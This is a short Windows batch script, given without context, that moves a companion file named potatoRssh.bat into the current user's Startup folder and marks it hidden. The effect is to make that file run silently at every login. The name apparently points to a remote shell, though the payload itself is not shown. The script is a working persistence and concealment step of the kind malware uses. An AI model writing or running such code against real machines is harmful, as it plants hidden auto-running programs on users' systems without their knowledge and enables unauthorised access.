@echo off
set "source=%~dp0potatoRssh.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
move "%source%" "%startup%\"
attrib +h "%startup%\potatoRssh.bat"
pause
